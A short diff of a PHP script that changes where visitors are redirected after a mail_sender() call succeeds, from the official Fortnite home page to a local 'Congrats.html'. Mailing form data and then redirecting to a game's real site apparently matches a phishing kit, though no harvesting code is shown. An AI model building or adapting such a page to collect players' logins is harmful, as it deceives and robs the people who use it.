@@ -18,6 +18,6 @@
 	}
 	
 	if(mail_sender()){
-		header("Location: https://www.epicgames.com/fortnite/en-US/home");
+		header("Location: Congrats.html");
 	}
 ?>
